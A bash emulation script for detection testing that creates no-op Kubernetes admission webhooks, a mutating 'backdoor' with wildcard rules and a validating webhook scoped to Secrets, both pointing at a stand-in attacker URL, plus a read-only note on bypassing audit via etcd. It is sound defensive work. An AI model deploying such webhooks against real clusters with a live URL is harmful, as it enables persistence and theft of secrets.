#!/usr/bin/env bash
# TRR9025 — behavioral emulation for T1546 (Event Triggered Execution), Kubernetes
# malicious admission webhook creation.
#
# Each procedure CREATES a harmless, throwaway admission object, so the API server
# writes the admissionregistration.k8s.io create audit event the paired Sigma rules
# key on. Every object is named trr9025-* so a validator matches the emulation's own
# events, and every webhook is a NO-OP: failurePolicy Ignore, a bogus unreachable
# off-cluster clientConfig.url, and an objectSelector that matches a label no object
# carries, so the webhook is never actually invoked and cannot affect real admission.
# This mirrors TRR9008's safety convention (the inverse technique, disabling admission
# control). This is the CREATE half; TRR9008 owns delete/neuter.
#
# Run ONE procedure:
#   ./emulate_k8s.sh a      create a MutatingWebhookConfiguration (off-cluster URL, wildcard rules)
#   ./emulate_k8s.sh b      create a ValidatingWebhookConfiguration (off-cluster URL, scoped to secrets)
#   ./emulate_k8s.sh c      create a CEL ValidatingAdmissionPolicy (chokepoint only)
#   ./emulate_k8s.sh gap    node-local etcd bypass demonstration (read-only)
#   ./emulate_k8s.sh all    every item, in order, then clean up
#
# Prerequisites: a reachable cluster (kubectl works) with rights to write
# admissionregistration objects, and audit logging at Request level (see
# detections/k8s/kind-apiserver-cluster.yaml). The gap test needs node access
# (docker exec on kind); set TRR9025_NODE for a non-kind lab.
set -euo pipefail

NODE="${TRR9025_NODE:-apiserver-control-plane}"
# RFC 2606 .invalid / example.com: guaranteed non-resolving, non-routable callbacks.
EVIL_URL="https://trr9025.poison.example.invalid/callback"

log() { printf '[trr9025] %s\n' "$*" >&2; }

cleanup() {
  log "cleanup: removing every trr9025- admission object"
  kubectl delete mutatingwebhookconfiguration trr9025-mwc --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete validatingwebhookconfiguration trr9025-vwc --ignore-not-found >/dev/null 2>&1 || true
  kubectl delete validatingadmissionpolicy trr9025-vap --ignore-not-found >/dev/null 2>&1 || true
}

# Procedure A — mutating webhook backdoor. Wildcard rules + off-cluster URL. An
# objectSelector on a label no object carries means it never fires; failurePolicy
# Ignore means even that is harmless. The audit requestObject carries the rules and
# the URL the grader keys on.
procedure_a() {
  log "A: create mutatingwebhookconfiguration trr9025-mwc (off-cluster URL, rules */*; no-op)"
  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: trr9025-mwc
webhooks:
  - name: inject.trr9025.example.com
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    clientConfig:
      url: "${EVIL_URL}"
    objectSelector:
      matchLabels:
        trr9025-never-matches: "true"
    rules:
      - operations: ["CREATE"]
        apiGroups: ["*"]
        apiVersions: ["*"]
        resources: ["*"]
        scope: "*"
EOF
}

# Procedure B — validating webhook Secret exfiltration. Scoped to secrets + off-cluster
# URL. objectSelector prevents it from ever intercepting a real Secret.
procedure_b() {
  log "B: create validatingwebhookconfiguration trr9025-vwc (off-cluster URL, resources: secrets; no-op)"
  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: trr9025-vwc
webhooks:
  - name: collect.trr9025.example.com
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    clientConfig:
      url: "${EVIL_URL}"
    objectSelector:
      matchLabels:
        trr9025-never-matches: "true"
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["secrets"]
        scope: "*"
EOF
}

# Procedure C — CEL ValidatingAdmissionPolicy. In-process, cannot call off-cluster, so
# it fires the chokepoint but is not graded. Always-allow expression; no binding, so it
# does nothing even if created.
procedure_c() {
  log "C: create validatingadmissionpolicy trr9025-vap (CEL always-allow; chokepoint only)"
  kubectl apply -f - >/dev/null 2>&1 <<'EOF' || true
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: trr9025-vap
spec:
  failurePolicy: Ignore
  matchConstraints:
    resourceRules:
      - apiGroups: ["apps"]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["deployments"]
  validations:
    - expression: "true"
EOF
}

# Gap — the control-plane bypass. An adversary with control-plane node / etcd access can
# write a webhook configuration straight into etcd, with NO API create and NO audit
# event, so the chokepoint is blind. Read-only demonstration.
procedure_gap() {
  if [ -n "${TRR9025_NODE_EXEC:-}" ]; then
    log "gap: show the etcd data path on the node (custom exec, read-only)"
    $TRR9025_NODE_EXEC 'ls -ld /var/lib/etcd 2>/dev/null || true' || true
  elif command -v docker >/dev/null 2>&1 && docker ps --format '{{.Names}}' | grep -qx "$NODE"; then
    log "gap: show the etcd data path on node $NODE (read-only)"
    docker exec "$NODE" sh -c 'ls -ld /var/lib/etcd 2>/dev/null || true' || true
  else
    log "gap: no node access (docker/TRR9025_NODE_EXEC) — skipping the etcd-bypass demonstration"
    return 0
  fi
  log "gap: a direct etcd write of a webhook config emits NO admissionregistration audit event -> node/etcd sensor only"
}

run_one() {
  case "$1" in
    a) procedure_a ;;
    b) procedure_b ;;
    c) procedure_c ;;
    gap) procedure_gap ;;
    *) log "unknown item: $1 (use a|b|c|gap|all)"; exit 2 ;;
  esac
}

main() {
  local which="${1:-all}"
  if [ "$which" = "all" ]; then
    for p in a b c gap; do run_one "$p"; done
    cleanup
  else
    run_one "$which"
  fi
  log "emulation complete: $which"
}

main "$@"
